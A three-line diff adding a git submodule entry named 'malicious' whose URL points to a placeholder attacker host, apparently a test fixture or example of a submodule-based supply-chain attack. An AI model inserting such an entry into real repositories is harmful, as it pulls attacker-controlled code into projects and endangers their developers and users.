@@ -1,0 +1,3 @@
+[submodule "malicious"]
+    path = malicious
+    url = https://attacker.com/malicious.git
